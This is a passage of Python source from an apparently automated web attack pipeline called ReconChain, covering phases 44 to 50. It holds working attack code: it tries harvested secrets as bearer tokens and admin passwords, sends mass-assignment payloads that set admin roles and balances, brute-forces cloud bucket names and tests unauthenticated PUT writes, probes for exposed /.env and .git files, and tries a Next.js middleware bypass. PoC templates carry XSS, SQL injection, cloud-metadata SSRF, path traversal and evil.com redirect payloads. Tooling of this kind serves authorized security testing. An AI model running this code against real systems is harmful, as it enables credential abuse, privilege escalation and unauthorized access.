        _ch_extra_headers = _extra_headers_dict()
        findings.append(f"credential_test: {len(secrets)} secrets × {len(auth_endpoints)} endpoints")
        for secret in secrets[:_PIPELINE_CFG.sample_endpoints_l]:
            for endpoint in auth_endpoints[:_PIPELINE_CFG.sample_endpoints_l]:
                await _throttle_rate()
                try:
                    # Try the secret as a bearer token
                    req = urllib.request.Request(endpoint, method="GET",
                        headers={"Authorization": f"Bearer {secret.strip()}", "User-Agent": "Mozilla/5.0", **_ch_extra_headers})
                    s, _, _ = await _async_urlopen(_ch_urlopen, req, timeout=10)
                    if s == 200:
                        findings.append(f"[credential-hit] Bearer {secret[:60]}... → HTTP 200 on {endpoint}")
                    # Also try as form-encoded credential
                    data = urllib.parse.urlencode({"username": "admin", "password": secret.strip()}).encode()
                    req2 = urllib.request.Request(endpoint, data=data, method="POST",
                        headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0", **_ch_extra_headers})
                    s2, _, _ = await _async_urlopen(_ch_urlopen, req2, timeout=10)
                    if s2 in (200, 302):
                        findings.append(f"[credential-hit] admin:{secret[:60]}... → HTTP {s2} on {endpoint}")
                except Exception:
                    continue
    # 2. Cross-reference IDOR endpoints with mass-assignment payloads
    idor_file = outdir / "idor.txt"
    if idor_file.exists():
        idor_endpoints: Set[str] = set()
        for ln in read_lines(idor_file):
            for token in ln.split():
                if token.startswith("http"):
                    idor_endpoints.add(token.split("?")[0])
                    break
        if idor_endpoints:
            _ma_urlopen = _get_urlopener()
            _MASS_ASSIGN_VALUES_CHAIN: Dict[str, object] = {
                "admin": True, "is_admin": True, "role": "admin", "roles": ["admin"],
                "permissions": ["admin"], "plan": "enterprise", "tier": "premium",
                "balance": 999999, "points": 999999,
            }
            findings.append(f"idor_mass_assign_test: {len(idor_endpoints)} endpoints")
            for ep in sorted(idor_endpoints)[:_PIPELINE_CFG.sample_endpoints_l]:
                for field, val in _MASS_ASSIGN_VALUES_CHAIN.items():
                    await _throttle_rate()
                    body = json.dumps({field: val}).encode()
                    try:
                        req = urllib.request.Request(ep, data=body, method="POST",
                            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"})
                        ms, _, _ = await _async_urlopen(_ma_urlopen, req, timeout=8)
                        if ms in (200, 201, 302):
                            findings.append(f"[idor-massassign] {ep} POST {{{field}: {json.dumps(val)}}} → HTTP {ms}")
                    except Exception:
                        continue
    # 3. Check for SSRF-to-LFI chaining
    ssrf_meta = outdir / "ssrf_meta.txt"
    if ssrf_meta.exists():
        for ln in read_lines(ssrf_meta):
            if "credential-exfil" in ln:
                findings.append(f"[chain-ssrf-lfi] SSRF metadata exfiltration: {ln}")
    if not findings:
        findings.append("[result] No cross-phase correlations identified")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"44-CHAIN: {len(findings)} correlations → {out}")
    return {"44-CHAIN": str(_out), "count": len(findings)}

# ── PoC helper functions (used by phase_45_EVIDENCE) ──────────────

def _detect_finding_type(line: str) -> str:
    lc = line.lower()
    if lc.startswith("[xss]") or lc.startswith("[domxss]"):
        return "xss"
    if lc.startswith("[sqlmap]") or lc.startswith("[sql-injection]"):
        return "sql-injection"
    if lc.startswith("[ssrf]") or lc.startswith("[ssrf-meta]"):
        return "ssrf"
    if lc.startswith("[idor]") or lc.startswith("[massassign]") or lc.startswith("[idor-massassign]"):
        return "idor"
    if lc.startswith("[open-redirect]") or lc.startswith("[redirect]"):
        return "open-redirect"
    if lc.startswith("[auth-bypass]") or lc.startswith("[authz]"):
        return "auth-bypass"
    if lc.startswith("[cache-poison]") or lc.startswith("[wcd]"):
        return "cache-poison"
    if lc.startswith("[lfi]") or lc.startswith("[lfi-confirmed]") or lc.startswith("[path-traversal]"):
        return "lfi"
    if lc.startswith("[smuggling]") or lc.startswith("[h2-") or lc.startswith("[h3-"):
        return "smuggling"
    if lc.startswith("[ws-") or lc.startswith("[cswsh]"):
        return "websocket"
    if lc.startswith("[graphql-"):
        return "graphql"
    if lc.startswith("[ssti]"):
        return "ssti"
    return "generic"


def _extract_url_from_line(line: str) -> Optional[str]:
    for token in line.split():
        if token.startswith("http://") or token.startswith("https://"):
            return token
    return None


def _finding_type_label(ftype: str) -> str:
    labels = {
        "xss": "Cross-Site Scripting (XSS)",
        "sql-injection": "SQL Injection",
        "ssrf": "Server-Side Request Forgery (SSRF)",
        "idor": "Insecure Direct Object Reference (IDOR) / Mass Assignment",
        "open-redirect": "Open Redirect",
        "auth-bypass": "Authentication Bypass / Authorization Issue",
        "cache-poison": "Cache Poisoning / Web Cache Deception",
        "lfi": "Local File Inclusion / Path Traversal",
        "smuggling": "HTTP Request Smuggling / Desync",
        "websocket": "WebSocket / Cross-Site WebSocket Hijacking (CSWSH)",
        "graphql": "GraphQL Vulnerability",
        "ssti": "Server-Side Template Injection (SSTI)",
        "generic": "Security Finding",
    }
    return labels.get(ftype, "Security Finding")


def _estimate_confidence(line: str) -> str:
    lc = line.lower()
    if "critical" in lc:
        return "Critical"
    if "high" in lc or "confirmed" in lc:
        return "High"
    if "medium" in lc:
        return "Medium"
    if "low" in lc:
        return "Low"
    return "High"


def _description_from_line(line: str) -> str:
    for prefix in ("[finding]", "[confirmed]", "[lfi-confirmed]", "[credential-hit]",
                   "[idor]", "[credential-exfil]", "[sql-injection]", "[xss]",
                   "[ssti]", "[ssrf]", "[massassign]", "[idor-massassign]", "[domxss]",
                   "[sqlmap]", "[ssrf-meta]", "[open-redirect]", "[redirect]",
                   "[auth-bypass]", "[authz]", "[cache-poison]", "[wcd]",
                   "[lfi]", "[path-traversal]", "[smuggling]",
                   "[h2-", "[h3-", "[ws-", "[cswsh]", "[graphql-"):
        if line.lower().startswith(prefix):
            rest = line[len(prefix):].strip()
            parts = rest.split(" - ", 1)
            if len(parts) > 1:
                return parts[1].strip()
    return line.strip()


def _generate_poc_xss(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# XSS PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Payload\n<script>alert(1)</script>\n## Timestamp\n{timestamp}\n"


def _generate_poc_sql(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# SQL Injection PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Payload\n' OR 1=1 --\n## Timestamp\n{timestamp}\n"


def _generate_poc_ssrf(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# SSRF PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Payload\nhttp://169.254.169.254/latest/meta-data/\n## Timestamp\n{timestamp}\n"


def _generate_poc_idor(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# IDOR PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Notes\nChange numeric ID in URL to access other resources.\n## Timestamp\n{timestamp}\n"


def _generate_poc_redirect(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# Open Redirect PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Payload\nhttps://evil.com\n## Timestamp\n{timestamp}\n"


def _generate_poc_auth_bypass(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# Auth Bypass PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Timestamp\n{timestamp}\n"


def _generate_poc_cache_poison(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# Cache Poisoning PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Timestamp\n{timestamp}\n"


def _generate_poc_lfi(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# LFI PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Payload\n../../../../etc/passwd\n## Timestamp\n{timestamp}\n"


def _generate_poc_smuggling(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# Smuggling PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Timestamp\n{timestamp}\n"


def _generate_poc_websocket(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# WebSocket PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Timestamp\n{timestamp}\n"


def _generate_poc_graphql(line: str, url: Optional[str], timestamp: str) -> str:
    return f"# GraphQL PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Query\n{{ __typename }}\n## Timestamp\n{timestamp}\n"


def _generate_poc_generic(line: str, url: Optional[str], timestamp: str, ftype: str) -> str:
    label = _finding_type_label(ftype)
    return f"# {label} PoC\n## Finding\n{line}\n## URL\n{url or 'N/A'}\n## Timestamp\n{timestamp}\n"


def _generate_poc_content(
    line: str, finding_type: str, url: Optional[str],
    timestamp: str, phase_name: str,
) -> str:
    if finding_type == "xss":
        return _generate_poc_xss(line, url, timestamp)
    if finding_type == "sql-injection":
        return _generate_poc_sql(line, url, timestamp)
    if finding_type == "ssrf":
        return _generate_poc_ssrf(line, url, timestamp)
    if finding_type == "idor":
        return _generate_poc_idor(line, url, timestamp)
    if finding_type == "open-redirect":
        return _generate_poc_redirect(line, url, timestamp)
    if finding_type == "auth-bypass":
        return _generate_poc_auth_bypass(line, url, timestamp)
    if finding_type == "cache-poison":
        return _generate_poc_cache_poison(line, url, timestamp)
    if finding_type == "lfi":
        return _generate_poc_lfi(line, url, timestamp)
    if finding_type == "smuggling":
        return _generate_poc_smuggling(line, url, timestamp)
    if finding_type == "websocket":
        return _generate_poc_websocket(line, url, timestamp)
    if finding_type == "graphql":
        return _generate_poc_graphql(line, url, timestamp)
    if finding_type == "ssti":
        return _generate_poc_generic(line, url, timestamp, "ssti")
    return _generate_poc_generic(line, url, timestamp, finding_type)


def _generate_poc_index(poc_dir: Path, entries: List[Dict[str, str]]) -> None:
    if not entries:
        ensure(poc_dir / "README.md").write_text(
            "# Proofs of Concept\n\nNo PoCs were generated during this scan.\n"
        )
        return
    lines = [
        "# Proofs of Concept\n",
        f"**Total PoCs:** {len(entries)}\n",
        f"**Generated:** {datetime.now().isoformat(timespec='seconds')}\n",
        "---\n",
        "| # | PoC ID | Type | URL | Source Phase |\n",
        "|---|--------|------|-----|-------------|\n",
    ]
    for i, entry in enumerate(entries, 1):
        url_display = (entry["url"][:80] + "...") if len(entry["url"]) > 80 else entry["url"]
        lines.append(
            f"| {i} | [{entry['id']}]({entry['file']}) "
            f"| {entry['type']} "
            f"| `{url_display}` "
            f"| {entry['phase']} |\n"
        )
    lines.extend([
        "\n---\n",
        "*Generated by ReconChain Evidence Collector*\n",
    ])
    ensure(poc_dir / "README.md").write_text("".join(lines))


async def phase_45_EVIDENCE(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"45-EVIDENCE"}:
        return {}
    _out = outdir / "evidence.txt"
    if _out.exists() and not force:
        return {"45-EVIDENCE": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 45-EVIDENCE: capture evidence and generate structured PoCs")
    findings: List[str] = []
    _ev_urlopen = _get_urlopener()
    _ev_extra_headers = _extra_headers_dict()
    evidence_dir = ensure(outdir / "evidence_payloads")
    poc_dir = outdir / "evidence" / "poc"
    poc_dir.mkdir(parents=True, exist_ok=True)

    # Expanded finding prefixes
    finding_prefixes = [
        "[finding]", "[confirmed]", "[lfi-confirmed]", "[credential-hit]",
        "[idor]", "[credential-exfil]", "[sql-injection]", "[xss]",
        "[ssti]", "[ssrf]", "[massassign]", "[idor-massassign]", "[domxss]",
        "[sqlmap]", "[ssrf-meta]", "[open-redirect]", "[redirect]",
        "[auth-bypass]", "[authz]", "[cache-poison]", "[wcd]",
        "[lfi]", "[path-traversal]", "[smuggling]",
        "[h2-", "[h3-", "[ws-", "[cswsh]", "[graphql-",
    ]

    poc_index_entries: List[Dict[str, str]] = []
    poc_counter = 0

    for txt_file in sorted(outdir.glob("*.txt")):
        phase_name = txt_file.stem
        lines = read_lines(txt_file)
        if not lines:
            continue
        captured = 0
        for ln in lines:
            if any(ln.startswith(prefix) for prefix in finding_prefixes):
                timestamp = datetime.now().isoformat(timespec="seconds")
                findings.append(f"[{timestamp}] {phase_name}: {ln}")
                captured += 1
                poc_counter += 1
                finding_id = f"{_safe_name(phase_name)}_{poc_counter}"
                finding_type = _detect_finding_type(ln)
                url = _extract_url_from_line(ln)

                # Generate structured PoC file
                poc_content = _generate_poc_content(ln, finding_type, url, timestamp, phase_name)
                poc_file = poc_dir / f"poc_{finding_id}.md"
                poc_file.write_text(poc_content)
                findings.append(f"  PoC generated → {poc_file}")
                poc_index_entries.append({
                    "id": finding_id,
                    "type": finding_type,
                    "url": url or "N/A",
                    "file": f"poc_{finding_id}.md",
                    "phase": phase_name,
                })

                # Also attempt to fetch the URL for raw evidence (keep existing behavior)
                for token in ln.split():
                    if token.startswith("http") and "?" in token:
                        evidence_file = evidence_dir / f"{_safe_name(phase_name)}_{captured}.txt"
                        try:
                            req = urllib.request.Request(token, method="GET",
                                headers={"User-Agent": "Mozilla/5.0", **_ev_extra_headers})
                            ev_status, ev_headers, ev_body = await _async_urlopen(_ev_urlopen, req, timeout=10)
                            ev_body_text = ev_body.decode("utf-8", errors="ignore")
                            evidence_file.write_text(
                                f"URL: {token}\n"
                                f"Status: {ev_status}\n"
                                f"Headers: {dict(ev_headers)}\n"
                                f"Body:\n{ev_body_text[:5000]}\n"
                            )
                            findings.append(f"  evidence saved → {evidence_file}")
                        except Exception:
                            pass
                        break
        if captured > 0:
            findings.append(f"  [{phase_name}] {captured} finding(s) captured")

    # Generate PoC index
    _generate_poc_index(poc_dir, poc_index_entries)

    if not findings:
        findings.append("[result] No finding markers found across phase outputs")

    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"45-EVIDENCE: {len(findings)} evidence entries, {poc_counter} PoCs → {out}")
    return {"45-EVIDENCE": str(_out), "count": len(findings)}


# ───────────────────────────── pipeline runner ─────────────────────────────

# ─────────── New phases (enhancements) ───────────

async def phase_46_BUCKET(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"46-BUCKET"}:
        return {}
    _out = outdir / "bucket_enum.txt"
    if _out.exists() and not force:
        return {"46-BUCKET": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 46-BUCKET: cloud bucket enumeration (AWS/GCP/Azure)")
    domains = set()
    for key in ("01-RECON", "02-RESOLVE", "04-SCAN"):
        p = prev.get(key)
        if p and isinstance(p, str):
            for ln in read_lines(Path(p)) if Path(p).exists() else []:
                ln = ln.strip().lower()
                if ln:
                    domains.add(ln)
    subs = outdir / "all_subs.txt"
    if subs.exists():
        for ln in read_lines(subs):
            ln = ln.strip().lower()
            if ln:
                domains.add(ln)
    findings: List[str] = []
    seen: Set[str] = set()
    for d in sorted(domains)[:_PIPELINE_CFG.sample_hosts_cloud]:
        base = d.split(".")[0]
        candidates = [
            f"https://{base}.s3.amazonaws.com",
            f"https://{base}-assets.s3.amazonaws.com",
            f"https://{base}-backup.s3.amazonaws.com",
            f"https://{base}-uploads.s3.amazonaws.com",
            f"https://{base}.s3-website-{random.choice(['us-east-1', 'us-west-2', 'eu-west-1'])}.amazonaws.com",
            f"https://{base}.storage.googleapis.com",
            f"https://{base}-assets.storage.googleapis.com",
            f"https://{base}.blob.core.windows.net",
            f"https://{base}-assets.blob.core.windows.net",
            f"https://{base}.digitaloceanspaces.com",
        ]
        for url in candidates:
            if url in seen:
                continue
            seen.add(url)
            try:
                await _throttle_rate()
                req = urllib.request.Request(url, method="HEAD")
                urlopen = _get_urlopener()
                code, _, _ = await _async_urlopen(urlopen, req, timeout=10)
                if code < 400:
                    findings.append(f"[open] {url} (HTTP {code})")
                elif code == 403:
                    findings.append(f"[restricted] {url} (HTTP 403)")
            except Exception:
                continue
    ensure(_out).write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"46-BUCKET: {len(findings)} bucket(s) found")
    return {"46-BUCKET": str(_out), "count": len(findings)}


async def phase_47_CDN(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"47-CDN"}:
        return {}
    _out = outdir / "cdn_detection.txt"
    if _out.exists() and not force:
        return {"47-CDN": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 47-CDN: CDN detection and origin IP discovery")
    hosts = set()
    for key in ("02-RESOLVE", "04-SCAN"):
        p = prev.get(key)
        if p and isinstance(p, str) and Path(p).exists():
            for ln in read_lines(Path(p)):
                ln = ln.strip().lower()
                if ln and _is_valid_hostname(ln):
                    hosts.add(ln)
    resolved = outdir / "resolved.txt"
    if resolved.exists():
        for ln in read_lines(resolved):
            ln = ln.strip().lower()
            if ln and _is_valid_hostname(ln):
                hosts.add(ln)
    findings: List[str] = []
    cdn_signatures = {
        "cloudflare": ["cloudflare", "__cfduid", "cf-ray"],
        "cloudfront": ["cloudfront.net", "x-amz-cf-id"],
        "akamai": ["akamai", "akamaized"],
        "fastly": ["fastly", "x-fastly-request"],
        "incapsula": ["incapsula", "X-Iinfo"],
        "sucuri": ["sucuri", "x-sucuri-id"],
        "stackpath": ["stackpath", "stackpath-cdn"],
        "keycdn": ["keycdn"],
        "cdn77": ["cdn77"],
    }
    for h in sorted(hosts)[:_PIPELINE_CFG.sample_hosts_origin]:
        try:
            await _throttle_rate()
            urlopen = _get_no_redirect_urlopener()
            req = urllib.request.Request(f"https://{h}", method="HEAD")
            code, headers, _ = await _async_urlopen_no_redirect(urlopen, req, timeout=10)
            hdr_str = str(dict(headers)).lower()
            detected = [name for name, sigs in cdn_signatures.items() if any(s in hdr_str for s in sigs)]
            if detected:
                findings.append(f"[CDN] {h}: {', '.join(detected)}")
        except Exception:
            pass
    ensure(_out).write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"47-CDN: {len(findings)} CDN(s) detected")
    return {"47-CDN": str(_out), "count": len(findings)}

async def phase_48_CONTENT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"48-CONTENT"}:
        return {}
    _out = outdir / "content_discovery.txt"
    if _out.exists() and not force:
        return {"48-CONTENT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 48-CONTENT: content discovery via common paths")
    hosts = set()
    for key in ("02-RESOLVE", "04-SCAN"):
        p = prev.get(key)
        if p and isinstance(p, str) and Path(p).exists():
            for ln in read_lines(Path(p)):
                ln = ln.strip().lower()
                if ln and _is_valid_hostname(ln):
                    hosts.add(ln)
    targets = outdir / "host_targets.txt"
    if targets.exists():
        for ln in read_lines(targets):
            ln = ln.strip().lower()
            if ln and _is_valid_hostname(ln):
                hosts.add(ln)
    common_paths = [
        "/.env", "/.git/config", "/.git/HEAD", "/admin", "/api", "/backup",
        "/config", "/config.php", "/credentials", "/db", "/debug",
        "/docker-compose.yml", "/dump", "/index.php", "/info.php",
        "/jenkins", "/logs", "/node_modules", "/phpinfo.php",
        "/private", "/robots.txt", "/sitemap.xml", "/sql", "/ssh",
        "/swagger.json", "/swagger-ui.html", "/test", "/uploads",
        "/wp-admin", "/wp-content", "/wp-json", "/wsdl",
    ]
    findings: List[str] = []
    seen_urls: Set[str] = set()
    for h in sorted(hosts)[:_PIPELINE_CFG.sample_hosts_git]:
        for path in common_paths:
            url = f"https://{h}{path}"
            if url in seen_urls:
                continue
            seen_urls.add(url)
            if len(findings) >= _PIPELINE_CFG.sample_urls_fuzz:
                break
            try:
                await _throttle_rate()
                urlopen = _get_urlopener()
                req = urllib.request.Request(url, method="GET")
                code, _, body = await _async_urlopen(urlopen, req, timeout=10)
                if code < 400:
                    size = len(body)
                    findings.append(f"[found] {url} (HTTP {code}, {size}b)")
            except Exception:
                continue
    ensure(_out).write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"48-CONTENT: {len(findings)} path(s) discovered")
    return {"48-CONTENT": str(_out), "count": len(findings)}

async def phase_49_FRAMEWORKS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"49-FRAMEWORKS"}:
        return {}
    _out = outdir / "framework_vulns.txt"
    if _out.exists() and not force:
        return {"49-FRAMEWORKS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 49-FRAMEWORKS: web framework detection and vulnerability checks")
    findings: List[str] = []
    _fw_urlopen = _get_urlopener()
    _fw_extra_headers = _extra_headers_dict()
    hosts_file = outdir / "host_targets.txt"
    if not hosts_file.exists() or not read_lines(hosts_file):
        log("warn", "49-FRAMEWORKS: no host targets; skipping")
        return {"49-FRAMEWORKS": str(_out), "count": 0}
    hosts = read_lines(hosts_file)[:_PIPELINE_CFG.sample_hosts_frameworks]
    FRAMEWORK_SIGS: Dict[str, List[Dict[str, str]]] = {
        "Next.js": [{"type": "html", "marker": "__NEXT_DATA__"}, {"type": "header", "name": "x-powered-by", "value": "next"}],
        "React": [{"type": "html", "marker": "data-reactroot"}, {"type": "html", "marker": "data-reactid"}],
        "Vue": [{"type": "html", "marker": "data-v-"}, {"type": "html", "marker": "__vue__"}],
        "Angular": [{"type": "html", "marker": "ng-version"}, {"type": "html", "marker": "ng-app"}],
        "Svelte": [{"type": "html", "marker": "__svelte__"}, {"type": "html", "marker": "svelte-"}],
        "Astro": [{"type": "html", "marker": "astro-"}, {"type": "header", "name": "x-astro", "value": ""}],
        "Nuxt": [{"type": "html", "marker": "__NUXT__"}],
        "Vite": [{"type": "header", "name": "server", "value": "vite"}],
    }
    detected: Dict[str, Set[str]] = {}
    for host in hosts:
        await _throttle_rate()
        base = host if host.startswith("http") else f"https://{host}"
        base = base.rstrip("/")
        try:
            req = urllib.request.Request(base, headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
            _, resp_h, body_bytes = await _async_urlopen(_fw_urlopen, req, timeout=15)
            body = body_bytes.decode("utf-8", errors="ignore")
            for fw_name, sigs in FRAMEWORK_SIGS.items():
                for sig in sigs:
                    if sig["type"] == "html" and sig["marker"] in body:
                        detected.setdefault(host, set()).add(fw_name)
                        break
                    elif sig["type"] == "header":
                        hdr_val = resp_h.get(sig["name"], "").lower()
                        if (sig["value"] and sig["value"] in hdr_val) or (not sig["value"] and hdr_val):
                            detected.setdefault(host, set()).add(fw_name)
                            break
        except Exception:
            continue
    if not detected:
        findings.append("[frameworks] No web frameworks detected")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        log("ok", f"49-FRAMEWORKS: {len(findings)} findings → {out}")
        return {"49-FRAMEWORKS": str(_out), "count": len(findings)}
    for host, frameworks in detected.items():
        base = host if host.startswith("http") else f"https://{host}"
        base = base.rstrip("/")
        for fw in sorted(frameworks):
            findings.append(f"[framework-detected] {host} — {fw}")
            if fw == "Next.js":
                for path in ["/_next/data/", "/_next/static/"]:
                    try:
                        req = urllib.request.Request(base + path, method="HEAD", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[nextjs-exposed] {base}{path} — HTTP {s}")
                    except Exception:
                        continue
                try:
                    req = urllib.request.Request(base + "/", method="GET", headers={"User-Agent": "Mozilla/5.0", "x-middleware-subrequest": "true", **_fw_extra_headers})
                    s, rh, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                    if "x-middleware-rewrite" in str(rh).lower():
                        findings.append(f"[nextjs-middleware] {base} — x-middleware-subrequest bypass possible")
                except Exception:
                    continue
                for route in ["/_next/data/develop.json", "/_next/data/production.json"]:
                    try:
                        req = urllib.request.Request(base + route, method="GET", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, b = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200 and len(b) > 50:
                            findings.append(f"[nextjs-data-exposure] {base}{route} — HTTP {s}")
                    except Exception:
                        continue
            elif fw == "React":
                for path in ["/static/js/bundle.js.map", "/static/js/main.js.map"]:
                    try:
                        req = urllib.request.Request(base + path, method="HEAD", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[react-sourcemap] {base}{path} — sourcemap exposed")
                    except Exception:
                        continue
                try:
                    req = urllib.request.Request(base + "/sockjs-node/", method="HEAD", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                    s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                    if s < 400:
                        findings.append(f"[react-sockjs] {base}/sockjs-node/ — dev server exposed in prod")
                except Exception:
                    continue
            elif fw == "Vue":
                for path in ["/vue-multiselect/", "/vue-router/"]:
                    try:
                        req = urllib.request.Request(base + path, method="HEAD", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[vue-exposed] {base}{path} — HTTP {s}")
                    except Exception:
                        continue
            elif fw == "Angular":
                for path in ["/runtime.js", "/polyfills.js", "/runtime-es2015.js", "/polyfills-es2015.js"]:
                    try:
                        req = urllib.request.Request(base + path, method="HEAD", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[angular-exposed] {base}{path} — HTTP {s}")
                    except Exception:
                        continue
                for path in ["/runtime.js.map", "/polyfills.js.map"]:
                    try:
                        req = urllib.request.Request(base + path, method="HEAD", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[angular-sourcemap] {base}{path} — sourcemap exposed")
                    except Exception:
                        continue
            elif fw == "Svelte":
                for path in ["/__action/", "/__action/__form/"]:
                    try:
                        req = urllib.request.Request(base + path, data=b"", method="POST", headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, _ = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s in (200, 302, 405):
                            findings.append(f"[sveltekit-action] {base}{path} — HTTP {s}")
                    except Exception:
                        continue
            elif fw == "Astro":
                for path in ["/_astro/", "/astro.env"]:
                    try:
                        req = urllib.request.Request(base + path, method="GET", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, b = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200 and len(b) > 20:
                            findings.append(f"[astro-exposed] {base}{path} — HTTP {s}")
                    except Exception:
                        continue
            elif fw == "Nuxt":
                for path in ["/_nuxt/", "/_nuxt/builds/meta/dev.json"]:
                    try:
                        req = urllib.request.Request(base + path, method="GET", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, b = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[nuxt-exposed] {base}{path} — HTTP {s}")
                    except Exception:
                        continue
            elif fw == "Vite":
                for path in ["/@vite/client", "/__vite_ping"]:
                    try:
                        req = urllib.request.Request(base + path, method="GET", headers={"User-Agent": "Mozilla/5.0", **_fw_extra_headers})
                        s, _, b = await _async_urlopen(_fw_urlopen, req, timeout=10)
                        if s == 200:
                            findings.append(f"[vite-dev-server] {base}{path} — HTTP {s}")
                    except Exception:
                        continue
    if not findings:
        findings.append("[frameworks] No framework-specific vulnerabilities detected")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"49-FRAMEWORKS: {len(findings)} framework findings → {out}")
    return {"49-FRAMEWORKS": str(_out), "count": len(findings)}

async def phase_50_BUCKET_PERMS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, force: bool = False,
) -> Dict[str, Any]:
    if skip & {"50-BUCKET-PERMS"}:
        return {}
    _out = outdir / "bucket_permissions.txt"
    if _out.exists() and not force:
        return {"50-BUCKET-PERMS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 50-BUCKET-PERMS: cloud bucket permission auditing")
    findings: List[str] = []
    _b_urlopen = _get_urlopener()
    _b_extra_headers = _extra_headers_dict()
    buckets_file = outdir / "cloud_buckets.txt"
    bucket_entries = read_lines(buckets_file) if buckets_file.exists() else []
    if not bucket_entries:
        findings.append("[bucket-perms] No cloud buckets to audit")
        out = ensure(_out)
        out.write_text("\n".join(findings) + "\n")
        return {"50-BUCKET-PERMS": str(out), "count": 0}

    async def _probe_bucket(url: str, label: str) -> List[str]:
        res: List[str] = []
        try:
            req = urllib.request.Request(url, method="GET",
                headers={"User-Agent": "Mozilla/5.0", **_b_extra_headers})
            s, _, body_bytes = await _async_urlopen(_b_urlopen, req, timeout=10)
            body = body_bytes.decode("utf-8", errors="ignore")
            if s == 200 and ("<Key" in body or "<Contents" in body or "ETag" in body or "Name>" in body):
                res.append(f"[bucket-public-read] {label} — {url} — HTTP {s} (public listing accessible)")
            elif s == 200:
                res.append(f"[bucket-public-access] {label} — {url} — HTTP {s}")
            elif s in (301, 302, 307):
                res.append(f"[bucket-redirect] {label} — {url} — HTTP {s}")
        except urllib.error.HTTPError as e:
            if e.code in (403, 400):
                pass
            elif e.code == 404:
                pass
            else:
                res.append(f"[bucket-http-error] {label} — {url} — HTTP {e.code}")
        except Exception:
            pass
        try:
            put_req = urllib.request.Request(url + "/.reconchain_permtest",
                data=b"reconchain-permtest", method="PUT",
                headers={"User-Agent": "Mozilla/5.0", **_b_extra_headers})
            ps, _, _ = await _async_urlopen(_b_urlopen, put_req, timeout=10)
            if ps in (200, 201, 204):
                res.append(f"[bucket-public-write] {label} — {url} — PUT HTTP {ps} (unauthenticated write)")
